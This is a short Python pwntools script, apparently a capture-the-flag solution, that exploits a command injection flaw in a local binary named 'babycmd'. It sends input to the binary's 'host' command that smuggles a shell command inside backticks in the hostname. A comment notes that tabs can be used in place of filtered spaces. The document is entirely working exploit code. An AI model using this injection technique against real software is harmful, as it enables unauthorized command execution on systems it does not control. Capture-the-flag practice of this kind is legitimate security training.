
from pwn import *

r = process('./babycmd')

print r.recv()

cmd = "ls"     # can't use space, but we can use tab

buf = ""
buf += "host "      # host command is vulnerable
buf += "pwn`"       # we can use `` to execute commands betweent he hostname
buf += cmd          # inject command here
buf +="`.com"       # host needs this to be a valid hostname
buf += "\n"

r.send(buf)
print r.recv()
print r.recv()
